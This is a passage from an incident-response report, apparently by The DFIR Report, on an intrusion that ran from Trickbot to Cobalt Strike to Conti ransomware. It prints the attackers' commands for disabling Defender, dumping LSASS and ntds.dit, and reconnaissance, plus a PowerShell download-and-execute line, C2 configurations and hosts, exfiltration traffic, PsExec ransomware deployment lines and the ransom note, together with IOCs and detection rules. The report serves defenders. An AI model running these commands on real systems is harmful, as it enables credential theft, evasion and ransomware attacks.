svchost.exe.\n\nAnother defense evasion technique employed by Cobalt Strike, was to disable Windows Defender. WMIC was used to remotely execute ‘def.bat’. The contents of ‘def.bat’:\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\n```\n\n## Credential Access\n\nTrickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot’s “pwgrab” module.\n\n```image\nAlt: Credential Access\nDescription: The image is a technical screenshot showing details related to the execution of the esentutl utility. It includes the file path of esentutl.exe, its version, a description of the software, and the command line used for its execution. The command line indicates that esentutl is being run with specific parameters to access user data and output it to a specified temporary file location. This information is relevant to the context of credential access in cyber threat intelligence.\nTranscription: |\n  Image: C:\\Windows\\System32\\esentutl.exe\n  FileVersion: 10.0.19041.1 (WinBuild.160101.0800)\n  Description: Extensible Storage Engine Utilities for Microsoft(R) Windows(R)\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: esentutl.exe\n  CommandLine: \"esentutl\" /p /o C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\grabber_temp.edb\n  CurrentDirectory: C:\\Users\\[REDACTED]\\AppData\\Roaming\\TDir5LFNHX\\\n```\n\nLSASS was dumped remotely using ProcDump. The execution took place from the beachhead using WMIC.\n\n```image\nAlt: LSASS Dump\nDescription: The image displays a screenshot of a command line utility, specifically the WMI Commandline Utility. It shows detailed information about the command executed using WMIC, including the description, product, company, original filename, and the command line that was used to dump the LSASS process. This context is essential for understanding the credential access methods employed by Trickbot in the cyber threat analysis.\nTranscription: |\n  Description: WMI Commandline Utility\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: wmic.exe\n  CommandLine: wmic /node:\"<REDACTED>.LOCAL\" process call create \"C:\\Perflogs\\procdump.exe -accepteula -ma lsass \"C:\\Perflogs\\lsass.dmp\"\n```\n\n“Ntdsutil” was used to take a snapshot of ntds.dit and save it under “C:\\Perflogs\\1”. This technique is useful for offline password hash extraction. This activity occurred twice. The same batch file, ‘12.bat’, was first executed in the context of SYSTEM; and secondly, in the context of a domain admin user. The contents of ‘12.bat’:\n\n```\nntdsutil \"ac in ntds\" \"ifm\" \"cr fu C:\\Perflogs\\1\" q q\n```\n\n## Discovery\n\nNet and Nltest commands were used to gather network and domain reconnaissance. During the intrusion, this activity was seen multiple times, on multiple hosts.\n\n```image\nAlt: Discovery\nDescription: The image displays a table listing various commands used for network and domain reconnaissance during a cyber intrusion. Each command is paired with its corresponding file path where results or relevant information are saved. The commands include 'net view /all', 'net localgroup Administrators', and 'nltest /domain_trusts /all_trusts', among others. The paths indicate where command outputs were stored, providing insight into the data collection process used by attackers.\nTranscription: |\n  | Command                           | Output Location                              |\n  |-----------------------------------|----------------------------------------------|\n  | net view /all                     | C:\\Users\\<hidden>\\AppData\\Roaming\\TDir5LFNHX |\n  | net view /all /domain             | C:\\Users\\<hidden>\\AppData\\Roaming\\TDir5LFNHX |\n  | net localgroup Administrators     | C:\\windows\\Temp\\Dogi\\                        |\n  | whoami.exe /groups                | C:\\windows\\Temp\\Dogi\\                        |\n  | nltest /domain_trusts             | C:\\Users\\<hidden>\\AppData\\Roaming\\TDir5LFNHX |\n  | nltest /domain_trusts /all_trusts | C:\\Users\\<hidden>\\AppData\\Roaming\\TDir5LFNHX |\n```\n\nOther discovery commands included:\n\n```\nsysteminfo\nnltest /dclist:<hidden>.local\nnltest /domain_trusts /all_trusts\nnet localgroup Administrators\nwhoami.exe /groups\n```\n\nAdFind.exe and adf.bat were uploaded to the beachhead. adf.bat was used to execute:\n\n```\nadfind.exe -f \"(objectcategory=person)\"\nadfind.exe -f \"(objectcategory=organizationalUnit)\"\nadfind.exe -f \"objectcategory=computer\"\nadfind.exe -gcb -sc trustdmp\nadfind.exe -f \"(objectcategory=group)\"\nadfind.exe -subnets -f (objectCategory=subnet)\nadfind.exe -sc trustdmp\n```\n\nAdFind results were written to the following locations:\n\n```\nC:\\Windows\\Temp\\adf\\ad_group.txt\nC:\\Windows\\Temp\\adf\\trustdmp.txt\nC:\\Windows\\Temp\\adf\\subnets.txt\nC:\\Windows\\Temp\\adf\\ad_ous.txt\nC:\\Windows\\Temp\\adf\\ad_computers.txt\nC:\\Windows\\Temp\\adf\\ad_users.txt\n```\n\nOn the beachhead, Cobalt Strike executed BloodHound in memory. The results were saved in:\n\n```\nC:\\Windows\\Temp\\Dogi\n```\n\nBloodHound was later executed on the domain controller as well. Once again the results were stored in:\n\n```\nC:\\Windows\\Temp\\Dogi\n```\n\nPowerSploit was loaded into memory on the DC and the following functions were used:\n\n```\nGet-NetSubnet\nGet-NetComputer –ping\n```\n\nAn encoded PowerShell command was executed on the domain controller to enumerate all AD joined hosts and save the results to:\n\n```\nC:\\Users\\AllWindows.csv\n```\n\n```image\nAlt: Encoded PowerShell Command\nDescription: The image displays a PowerShell command used in a cybersecurity context, specifically an encoded command that is likely part of a malicious activity. The command appears to be executed with parameters to bypass execution policies and run encoded commands. The background highlights various properties associated with the command, such as the 'Company' and 'ComputerName' fields, indicating that this command was executed on a Microsoft Corporation system. The current directory is shown as 'C:\\windows\\Temp\\Dogi\\', which suggests a temporary storage location for the execution of scripts or commands.\nTranscription: |\n  CommandLine: powershell -nop -exec bypass -EncodedCommand EAoA2DkAMQA5ACAAJwApADsAIAIgAIAcADABAYAHUAZQ8BACAAQBwAHIdADAAE0ABwKABhAIAHABkAQAaAB8A2AGURABpAHIAZQBiJABgBgBjAG8AZABpAG4AZwAgAFUAVABGADgA\n  Company: Microsoft Corporation\n  ComputerName: <hidden>\n  CurrentDirectory: C:\\windows\\Temp\\Dogi\\\n```\n\nThe decoded PowerShell command:\n\n```image\nAlt: Decoded PowerShell Command\nDescription: The image displays a PowerShell command output window showing an encoded PowerShell script. The command retrieves Active Directory computer details, filtering for enabled computers, and exports the results to a CSV file located at 'C:\\Users\\AllWindows.csv'. The script also includes the use of the 'IEX' command to execute a web download string, suggesting malicious activity related to network reconnaissance in a cybersecurity context.\nTranscription: |\n  IEX (New - Object Net.Webclient).DownloadString('http://127.0.0.1:6919/');\n  Import - Module ActiveDirectory;\n  Get - ADComputer - Filter {\n      enabled - eq $true\n  }\n  - properties * | select Name, IPv4Address, OperatingSystem, LastLogonDate, DNSHostName | Export - CSV C:\\Users\\AllWindows.csv - NoTypeInformation\n  - Encoding UTF8\n```\n\n## Lateral Movement\n\nFrom the beachhead, WMIC was used to remotely execute ‘165.bat’ on two other hosts.\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a screenshot of a command-line execution related to the WMI (Windows Management Instrumentation) Commandline Utility. It provides detailed information about the command executed, including its description, product, company, and the specific command line used to remotely execute the '165.bat' file on another host. This technical data is pertinent to understanding lateral movement in a cyber-attack scenario.\nTranscription: |\n  Description: WMI Commandline Utility\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: wmic.exe\n  CommandLine: wmic /node:LOCAL\" process call create \"C:\\Users\\165.bat\"\n```\n\nMultiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with “SYSTEM” privileges.\n\n```image\nAlt: PowerShell Loader\nDescription: The image displays a PowerShell command line that appears to be encoded. It is likely part of a malicious operation, specifically relating to the execution of a base64-encoded script using PowerShell. The command includes parameters such as '-nop' (no profile) and '-w' (window style), followed by the encoded content that could potentially be a payload related to lateral movement in a cyber attack.\nTranscription: |\n  Event    CommandLine\n  powershell -nop -w hidden -encodedcommand BBAEEAQBBAEEAQBBAEEAQBBAEEAQBBAEEAQBBAEEAQBBAEEAQBBAEEAQBBAEEAQBBAEEAQBB...\n```\n\n```image\nAlt: Cobalt Strike Loader\nDescription: The image appears to be a screenshot from a system monitoring or logging tool, displaying a table of event data. It includes columns for 'SourceName', 'TargetObject', and 'TaskCategory', indicating specific registry actions related to Windows services. This data likely pertains to a registry value being set, which could be relevant to tracking the activity of malware or other system changes during a cyber security incident.\nTranscription: |\n  | SourceName   | Microsoft-Windows-Sysmon                             |\n  |--------------|------------------------------------------------------|\n  | TargetObject | HKLM\\System\\CurrentControlSet\\Services\\d85b4b2\\Start |\n  | TaskCategory | Registry value set (rule: RegistryEvent)             |\n```\n\nDecoded Cobalt Strike shellcode, using Cyber Chef recipe:\nhttps://github.com/mattnotmax/cyberchef-recipes#recipe-28---de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode\n\n```image\nAlt: Decoded Shellcode\nDescription: The image displays the output from a deobfuscation process of Cobalt Strike shellcode, showing a series of seemingly random characters and symbols. This output suggests that the data has been processed to reveal its underlying structure, likely containing malicious code or commands used in a cyber attack. The context indicates this output is part of an analysis related to Cobalt Strike, which is often used in cyber threat scenarios.\nTranscription: |\n  üë....å1bd.R0.R...r.(..J&1y1à<|., ÁÏ\n  .C68R.W.R..B.<.D.@x.A$tJ.DP.H.X .óá<|.4..Ó1y1à–ÁÏ\n  $c8àu0.;}.$uàX.X$.F.K.X.0....D.$$[$[aYZQYàX_Z..ë.1]Aj@h....hyÿ...j.h×sàÿ0Pé´...Z1ÉQoh.o..h..o..j.j.RhEpß0yÖP..$j.Rh{o}\n  àYð.Atn.j..j..æÆ..âÂ.|$..j.Vj.Rwh.._..»yÖ.T$.j.Vh.._..»yÖ.At..L$...$.$.É..Àex.|$..WhÀúYûYhÆ..RýÖ..$.$.9At.höµvÝöý$.èsyÿ\\\\.\\pipe\\npfs_a0.Q çm\n```\n\n## Command and Control\n\nMultiple C2 channels were established, some were persistent whilst others appeared to be single-purpose – used for payload retrieval or fallback C2. Persistent C2 activity was Cobalt Strike. The beachhead had multiple C2 channels, two of which were unique. We assess that the threat actors were ensuring a loss of a single source C2 wouldn’t result in losing all C2 to the compromised environment.\n\nWe observed a payload being retrieved from a unique IPv4 address. An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.\n\n```image\nAlt: C2 Activity\nDescription: The image displays a network traffic log with an HTTP GET request on port 80. It shows the source IP address '170.130.55.186' and the requested file path '/cert/bec_http_222_x86_13567_1.exe'. This log entry is relevant to cyber threat intelligence as it indicates potential malicious activity involving a request for an executable file.\nTranscription: |\n  80\n  GET 170.130.55.186 /cert/bec_http_222_x86_13567_1.exe\n```\n\nUsing the Curl 7.74.0 user agent:\n\n```image\nAlt: Curl User Agent\nDescription: The image displays a snippet of a command line interface showing HTTP request headers. It includes a User-Agent string indicating the use of Curl version 7.74.0 and a Host header with the IP address 170.130.55.186. This information is relevant in the context of network communications, particularly in identifying the tools and endpoints involved in command and control operations related to cybersecurity threats.\nTranscription: |\n  User-Agent: curl/7.74.0\n  Host: 170.130.55.186\n```\n\nAnalysis of this binary shows C2 activity to the following:\n\n```image\nAlt: C2 Analysis\nDescription: The image displays a segment of text showing the domain 'gmbfrom.com' and a URL pointing to a jQuery file hosted on that domain. This information is likely related to the command and control (C2) infrastructure discussed in the accompanying CTI content, indicating how the threat actors are using this domain for malicious purposes.\nTranscription: |\n  gmbfrom.com\n  https://gmbfrom.com/jquery-3.3.1.min.js\n```\n\nThe binary has an unusual PDB string that indicates obfuscation:\n\n```image\nAlt: PDB String\nDescription: The image displays a table containing detailed information about a binary file related to cyber threat intelligence. It includes attributes such as 'age', 'size', 'format', 'debugger-stamp', 'path', and 'guid', providing insights into the characteristics of the binary. This information is relevant for analyzing the binary's behavior and potential malicious use.\nTranscription: |\n  age: 1\n  size: 129 (bytes)\n  format: RSDS\n  debugger-stamp: 0x60BF9A0E (Tue Jun 08 16:25:50 2021)\n  path: f:\\2b0d\\ktqbofsj0\\v8vm0rs505\\cbolqnmhijm\\ojki01\\ots5k5w3k\\mf0nurkns7\\ynih\\4jawi.pdb\n  guid: 8F37B92D-04B4-41DB-BDA1-A5865269895F\n```\n\nThe two persistent C2 channels were analyzed to determine the Cobalt Strike configuration. Each C2 channel was configured as follows:\n\n- 149.248.52[.]187:443\n- Onlineworkercz[.]com\n  (added to Threat Feed on 2021-06-11)\n\n```\n{\n  \"x86\": {\n    \"sha1\": \"3f15a07cde64efda49670664af320603cf19e8a3\",\n    \"sha256\": \"d4ab4ed720d674d4c8c35d48006724a9cf20396e020d5bd6c12fce8d44b8ed5a\",\n    \"time\": 1623422265288,\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT[.]exe\",\n      \"Polling\": 55490,\n      \"HTTP Method Path 2\": \"/media\",\n      \"Port\": 443,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT[.]exe\",\n      \"Jitter\": 41,\n      \"C2 Server\": \"onlineworkercz[.]com,/kj\",\n      \"Method 2\": \"POST\",\n      \"Beacon Type\": \"8 (HTTPS)\"\n    },\n    \"md5\": \"7d9cdea210ed05a1ff96d7ff3e576c11\"\n  },\n  \"x64\": {\n    \"sha1\": \"1d50772d506f1def4bd0659b38cf4cb41df7802c\",\n    \"sha256\": \"4f009eb4252cf29daa24d1d018815aa228f0c58aba126bff3fec4cd809cd9747\",\n    \"time\": 1623422268773.6,\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT[.]exe\",\n      \"Polling\": 55490,\n      \"HTTP Method Path 2\": \"/zh\",\n      \"Port\": 443,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT[.]exe\",\n      \"Jitter\": 41,\n      \"C2 Server\": \"onlineworkercz[.]com,/kj\",\n      \"Method 2\": \"POST\",\n      \"Beacon Type\": \"8 (HTTPS)\"\n    },\n    \"md5\": \"23135b04a470db515db11e1364e3fcd9\"\n  }\n}\n```\n\n- 88.80.147[.]101:80\n- gmbfrom[.]com\n  (added to Threat Feed on 2021-06-03)\n\n```\n{\n  \"x86\": {\n    \"sha1\": \"b785cae596f7b68376464e3e300fe0aff5bea845\",\n    \"config\": {\n      \"Method 2\": \"POST\",\n      \"Port\": 80,\n      \"Method 1\": \"GET\",\n      \"Polling\": 5000,\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Jitter\": 10,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost[.]exe\",\n      \"C2 Server\": \"88[.]80[.]147[.]101,/jquery-3[.]3[.]1[.]min[.]js\",\n      \"HTTP Method Path 2\": \"/jquery-3[.]3[.]2[.]min[.]js\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost[.]exe\"\n    },\n    \"time\": 1622753064031.5,\n    \"sha256\": \"dd0dd0b3e95ff62c45af048c0169e2631ac906da4a603cadbc7014cbcfb4e631\",\n    \"md5\": \"56830f9cc0fe712e22921a7a5a0f1a53\"\n  },\n  \"x64\": {\n    \"sha1\": \"11724324f8ec1940be87553ae2bd5f96b979a5d6\",\n    \"config\": {\n      \"Method 2\": \"POST\",\n      \"Port\": 80,\n      \"Method 1\": \"GET\",\n      \"Polling\": 5000,\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Jitter\": 10,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost[.]exe\",\n      \"C2 Server\": \"88[.]80[.]147[.]101,/jquery-3[.]3[.]1[.]min[.]js\",\n      \"HTTP Method Path 2\": \"/jquery-3[.]3[.]2[.]min[.]js\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost[.]exe\"\n    },\n    \"time\": 1622753068830.2,\n    \"sha256\": \"36a5e68810f3823470fadd578efb75b5c2d1ffe9f4a16d5566f0722257cc51ce\",\n    \"md5\": \"9dde7f14a076a5c3db8f4472b87fd11e\"\n  }\n}\n```\n\nTrickbot C2 Configuration:\nhttps://tria.ge/210610-vfygj4t1yn\n\n```image\nAlt: Trickbot C2 Configuration\nDescription: The image displays a table containing information related to the Trickbot malware. It includes columns for 'Family' and 'Version', specifying 'trickbot' and '100017' respectively. Additionally, there is a column labeled 'Botnet' indicating 'mon311'. The main focus of the image is a list of Command and Control (C2) IP addresses under the C2 column, each associated with port 443, showcasing various IP addresses used by the Trickbot botnet.\nTranscription: |\n  | Family   | Version | Botnet |\n  |----------|---------|--------|\n  | trickbot | 100017  | mon311 |\n  \n  ### C2\n  | IP Address          |\n  |---------------------|\n  | 178.72.192.20:443   |\n  | 45.5.152.39:443     |\n  | 85.248.1.126:443    |\n  | 146.196.121.219:443 |\n  | 94.142.179.77:443   |\n  | 85.175.171.246:443  |\n  | 180.178.106.50:443  |\n  | 46.209.140.220:443  |\n  | 123.231.149.123:443 |\n  | 131.0.112.122:443   |\n  | 103.101.104.229:443 |\n  | 103.242.104.68:443  |\n  | 103.124.145.98:443  |\n  | 114.7.240.222:443   |\n  | 94.183.237.101:443  |\n  | 89.37.1.2:443       |\n  | 177.221.39.161:443  |\n  | 103.12.160.164:443  |\n  | 94.142.179.179:443  |\n  | 123.231.149.122:443 |\n  | 182.160.116.190:443 |\n  | 116.0.6.110:443     |\n  | 88.150.240.129:443  |\n```\n\n## Exfiltration\n\nAs part of the discovery stage, we observed data being exfiltrated. The data ranged from host discovery, running processes, and user accounts:\n\n```image\nAlt: Exfiltration\nDescription: The image is a screenshot from Wireshark, showing an HTTP stream analysis. It reveals details of a POST request made from a Windows 10 system to a specified host. The request includes headers such as connection type, content type, user agent, and content length. Below the headers, there is a section titled 'PROCESS LIST,' which lists various system processes that were likely exfiltrated. The visible processes include critical Windows system components like 'System,' 'Registry,' 'smss.exe,' 'csrss.exe,' and others, indicating a potential data theft or reconnaissance activity associated with a cyber threat.\nTranscription: |\n  POST /sat1/WIN84_W10 HTTP/1.1\n  Connection: Keep-Alive\n  Content-Type: multipart/form-data; boundary=---WebKitFormBoundary7MA4YWxkTrZu0gW\n  User-Agent: Winhttp 1/0\n  Content-Length: 25257\n  Host: 115.127.160.171:443\n  \n  -----WebKitFormBoundary7MA4YWxkTrZu0gW\n  Content-Disposition: form-data; name=\"proclist\"\n  \n  --------------PROCESS LIST--------------\n  [System Process]\n  System\n  Registry\n  smss.exe\n  csrss.exe\n  wininit.exe\n  services.exe\n  lsass.exe\n  svchost.exe\n  svchost.exe\n```\n\nEntire AD forest data – including usernames, DC configuration, and machine enumeration:\n\n```image\nAlt: AD Forest Data\nDescription: The image shows a Wireshark packet capture output detailing information about a network stream. It includes user account details such as User Names, Computer Names, Domain Names, and Forest Trees related to an Active Directory environment. Sensitive information such as usernames (including Administrator and Guest) is listed, illustrating data exfiltration during a cyber attack.\nTranscription: |\n  Wireshark - Follow HTTP Stream (tcp.stream eq 0) - packets-1623422563.266608.pcap\n  \n  User_Name: CN=________,CN=Users,DC=________,DC=local\n  Computer_Name: CN=________,OU=________,DC=________,DC=local\n  Site_Name: Default-First-Site-Name\n  Domain_Shortname: ________\n  Domain_Name: ________.local\n  Forest_Name: ________.local\n  Domain_Controller: ________\n  Forest_Trees:\n  1) ________.local\n  \n  Username: Administrator\n  Username: Guest\n  Username: krbtgt\n  Username: ________\n  Username: ________\n```\n\n## Impact\n\nWhen the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:\n\n```\nC:\\share$\n```\n\n```image\nAlt: Payload Staging\nDescription: The image shows a log entry detailing a file creation event on a Windows system. It includes specific technical details such as the Process GUID, Process ID, image path of the executable (C:\\Windows\\System32\\rundll32.exe), target filename (C:\\share$.zip), and the creation UTC time. This information is relevant for understanding the behavior of malware or unauthorized activities within a compromised system.\nTranscription: |\n  \"File created:\n  RuleName: -\n  UtcTime:\n  ProcessGuid: {3d6f8f2c-80c2-60c3-1b25-000000000030}\n  ProcessId: 376\n  Image: C:\\Windows\\System32\\rundll32.exe\n  TargetFilename: C:\\share$.zip\n  CreationUtcTime:\n```\n\nTwo batch scripts were executed on the domain controller to automate ransomware deployment via PSExec. The first was “_COPY.bat”, to stage the CONTI ransomware payload on all domain-joined computers. The second was “_EXE.bat”, to execute the staged CONTI payloads.\n\n```image\nAlt: Batch Scripts\nDescription: The image displays a table with headers that include 'ParentImage', 'ParentCommandLine', 'Image', and 'CommandLine'. It provides details of various processes related to the execution of batch scripts for ransomware deployment. The entries in the table show the parent process, the command line used to execute the batch scripts, and the image paths for associated executable files, indicating a step in the ransomware attack process.\nTranscription: |\n  | ParentImage             | ParentCommandLine       | Image                       | CommandLine                                          |\n  |-------------------------|-------------------------|-----------------------------|------------------------------------------------------|\n  | C:\\Windows\\explorer.exe | C:\\Windows\\Explorer.EXE | C:\\Windows\\System32\\cmd.exe | C:\\Windows\\System32\\cmd.exe /c \"C:\\share$\\_COPY.bat\" |\n  | C:\\Windows\\explorer.exe | C:\\Windows\\Explorer.EXE | C:\\Windows\\System32\\cmd.exe | C:\\Windows\\System32\\cmd.exe /c \"C:\\share$\\_EXE.bat\"  |\n```\n\nThe batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.\n\n```\nstart PsExec.exe -accepteula @C:\\share$\\comps1.txt -u \"domain\\User\" -p \"$PASSWORD\" cmd /c COPY \"\\\\DOMAINCONTROLLER\\share$\\fQumH.exe\" \"C:\\windows\\temp\\\"\n```\n\n```\nstart PsExec.exe -accepteula -d @C:\\share$\\comps5.txt -u \"domain\\User\" -p \"$PASSWORD\" cmd /c \"C:\\windows\\temp\\fQumH.exe\"\n```\n\nFiles were then encrypted with the following extension [KCRAO]:\n\n```image\nAlt: Encrypted Files\nDescription: The image depicts a list of files that have been encrypted by ransomware, indicated by the '.KCRAO' file extension. The files are named 'comps1.txt.KCRAO', 'comps2.txt.KCRAO', 'comps3.txt.KCRAO', 'comps4.txt.KCRAO', and 'comps5.txt.KCRAO', showing that the original text files have been affected by the ransomware attack. This is relevant to the context of ransomware deployment and encryption impacts.\nTranscription: |\n  comps1.txt.KCRAO\n  comps2.txt.KCRAO\n  comps3.txt.KCRAO\n  comps4.txt.KCRAO\n  comps5.txt.KCRAO\n```\n\nA readme.txt file was created in each folder:\n\n```image\nAlt: Readme File\nDescription: The image displays a technical representation of a file path and target filename related to a ransomware attack. It shows the source path `C:\temp\nTranscription: |\n  Image: C:\\windows\\temp\\fQumH.exe\n  TargetFilename: C:\\Users\\*\\Downloads\\readme.txt\n```\n\nThe content of readme.txt:\n\n```image\nAlt: Readme Content\nDescription: The image depicts a web page titled \"CONTI Recovery service\" with a turquoise background. The page informs victims that their network has been compromised by the CONTI ransomware team, indicating that all files and databases have been encrypted with military-grade algorithms. It mentions that there is no free decryption tool available and advises against relying on antivirus solutions or law enforcement for data recovery. Additionally, it instructs users to upload a \"README.TXT\" file for further assistance regarding decryption.\nTranscription: |\n  CONTI Recovery service\n  \n  If you are looking at this page right now, that means that your network was successfully breached by CONTI team.\n  \n  All of your files, databases, application files etc were encrypted with military-grade algorithms.\n  \n  If you are looking for a free decryption tool right now - there's none.\n  \n  Antivirus labs, researches, security solution providers, law agencies won't help you to decrypt the data.\n  \n  If you are interested in our assistance upon this matter - you should upload README.TXT file to be provided with further instructions upon decryption.\n  \n  [Choose File] No file chosen\n  \n  [Web mirror] [Tor mirror]\n```\n\n---\n\n## IOCs\n\n**Network**\n\n```\nCobalt Strike\n149.248.52.187|443\n88.80.147.101|80\nonlineworkercz.com\ngmbfrom.com\n\nTrickbot\n116.0.6.110\n123.231.149.123\n146.196.121.219\n177.221.39.161\n180.178.106.50\n85.248.1.126\n94.142.179.179\n94.142.179.77\n88.150.240.129\n46.209.140.220\n85.175.171.246\n89.37.1.2\n94.183.237.101\n103.101.104.229\n103.124.145.98\n114.7.240.222\n131.0.112.122\n123.231.149.122\n45.5.152.39\n```\n\n**File**\n\n```\nnetscan.exe\nd1d579306a4ddf79a2e7827f1625581c\ne141562aab9268faa4aba10f58052a16b471988a\nbb574434925e26514b0daf56b45163e4c32b5fc52a1484854b315f40fd8ff8d2\n\n12.bat\n935fa508d2c41914f4549d3805456444\nd40b5147e93204f03f0acfb3ad4cbb1b6f296a35\nf88a59e0c1aa48aa46680f28c9e09781d3f678567f38e3b1b1ba7d2437cd9e0c\n\ndef.bat\nabe4a11df74f6a2f07682174b5fb2876\ne928fc3d74b976c539d55f75318b5ba89dab3f11\n8a7399c37a27c46e1d61150cba71d76737233a971e0c15b07c47bcc97e710bbe\n\nprocdump.exe\n6a09bc6c19c4236c0bd8a01953371a29\nd1387f3c94464d81f1a64207315b13bf578fd10c\n05732e84de58a3cc142535431b3aa04efbe034cc96e837f93c360a6387d8faad\n\ntdr615.exe\na53f124fc4f07a26cc3497e665d0ec63\n3f0a4ed4c0c1c5e156e4d29ac4adf109faa82cd9\n12761d7a186ff14dc55dd4f59c4e3582423928f74d8741e7ec9f761f44f369e5\n\ntdrE934.exe\nd803ea86227c541c54b11bb583b3910f\nf1b4faf4dfbf9ada3cc1496f9f9ad352314c2d59\n48f2e2a428ec58147a4ad7cc0f06b3cf7d2587ccd47bad2ea1382a8b9c20731c\n\nstart.bat\n4841c54b37729544fddcd014f09aa46e\nf7d62cdca59fc09d19fa8a465ea3b2611cf797e1\nf37b6c37e95f3fa27382f8b8e6256aa05e28703332bda54184e7223f82f02114\n\nGet-DataInfo.ps1\n16cde93b441e4363700dfbf34c687b08\n092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\na290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\n\n62.dll\n9e7756f47e57a03e6eb5fe7d2505b870\nfb6339704bf11507038ddaf8f01324da5b71ee19\n8b9d605b826258e07e63687d1cefb078008e1a9c48c34bc131d7781b142c84ab\n\ncancel_sub_VCP1234567890123.xlsx\n9e1ee4a42c381eabcf2cde38a1aae7c9\n015bb306d9e54001d433b3ac2e7212b864f54ae2\nfd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3\n```\n\n## Detections\n\n**Network**\n\n```\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)\nET CNC Feodo Tracker Reported CnC Server group 1\nET CNC Feodo Tracker Reported CnC Server group 2\nET CNC Feodo Tracker Reported CnC Server group 3\nET CNC Feodo Tracker Reported CnC Server group 5\nET CNC Feodo Tracker Reported CnC Server group 8\nET CNC Feodo Tracker Reported CnC Server group 9\nET CNC Feodo Tracker Reported CnC Server group 19\nET CNC Feodo Tracker Reported CnC Server group 22\nET CNC Feodo Tracker Reported CnC Server group 23\nET CNC Feodo Tracker Reported CnC Server group 24\nET POLICY HTTP traffic on port 443 (POST)\nET POLICY PE EXE or DLL Windows file download HTTP\nET POLICY curl User-Agent Outbound\nET HUNTING SUSPICIOUS Dotted Quad Host MZ Response\nET INFO Executable Download from dotted-quad Host\nET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1\nET MALWARE Trickbot Checkin Response\nET POLICY Observed Cloudflare DNS over HTTPS Domain (cloudflare-dns .com in TLS SNI)\nET HUNTING Suspicious POST with Common Windows Process Names - Possible Process List Exfiltration\nET MALWARE Win32/Trickbot Data Exfiltration\nET POLICY IP Check wtfismyip.com\nGPL ATTACK_RESPONSE command completed\nET HUNTING Observed Suspicious SSL Cert (External IP Lookup - ident .me)\nET INFO Dotted Quad Host DLL Request\nET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile M3\nET POLICY Possible External IP Lookup ipinfo.io\n```\n\n**Sigma**\n\n- Abused Debug Privilege by Arbitrary Parent Processes\n- Accessing WinAPI in PowerShell. Code Injection\n- Bad Opsec Powershell Code Artifacts\n- CobaltStrike Service Installations\n- CreateMiniDump Hacktool\n- Domain Trust Discovery\n- Dridex Process Pattern\n- Empire PowerShell Launch Parameters\n- Execution from Suspicious Folder\n- Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\n- Local Accounts Discovery\n- LSASS Memory Dump\n- LSASS Memory Dump File Creation\n- LSASS Memory Dumping\n- Malicious Base64 Encoded PowerShell Keywords in Command Lines\n- Malicious PowerShell Commandlets\n- Mimikatz Detection LSASS Access\n- Net.exe Execution\n- Non Interactive PowerShell\n- PowerShell as a Service in Registry\n- PowerShell Download from URL\n- PowerShell Execution\n- PowerShell Network Connections\n- PowerShell Scripts Installed as Services\n- Psexec Accepteula Condition\n- PsExec Tool Execution\n- Rare Service Installs\n- Regsvr32 Anomaly\n- Rundll32 Internet Connection\n- Suspicious AdFind Execution\n- Suspicious Encoded PowerShell Command Line\n- Suspicious In-Memory Module Execution\n- Suspicious PowerShell Parent Process\n- Suspicious Remote Thread Created\n- Suspicious Use of Procdump\n- Suspicious Use of Procdump on LSASS\n- Suspicious WMI Execution\n- Trickbot Malware Recon Activity\n- UNC2452 Process Creation Patterns\n- Usage of Sysinternals Tools\n- Whoami Execution\n- Windows Network Enumeration\n- Windows PowerShell Web Request\n\n**Yara Rules**\n\n```\n/*\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-08-02\nIdentifier: 4641\nReference: https://thedfirreport.com\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule sig_4641_fQumH {\nmeta:\ndescription = \"4641 - file fQumH.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-08-02\"\nhash1 = \"3420a0f6f0f0cc06b537dc1395638be0bffa89d55d47ef716408309e65027f31\"\nstrings:\n$s1 = \"Usage: .system COMMAND\" fullword ascii\n$s2 = \"Usage: .log FILENAME\" fullword ascii\n$s3 = \"* If FILE begins with \\\"|\\\" then it is a command that generates the\" fullword ascii\n$s4 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s5 = \"Usage %s sub-command ?switches...?\" fullword ascii\n$s6 = \"attach debugger to process %d and press any key to continue.\" fullword ascii\n$s7 = \"%s:%d: expected %d columns but found %d - extras ignored\" fullword ascii\n$s8 = \"%s:%d: expected %d columns but found %d - filling the rest with NULL\" fullword ascii\n$s9 = \"Unknown option \\\"%s\\\" on \\\".dump\\\"\" fullword ascii\n$s10 = \"REPLACE INTO 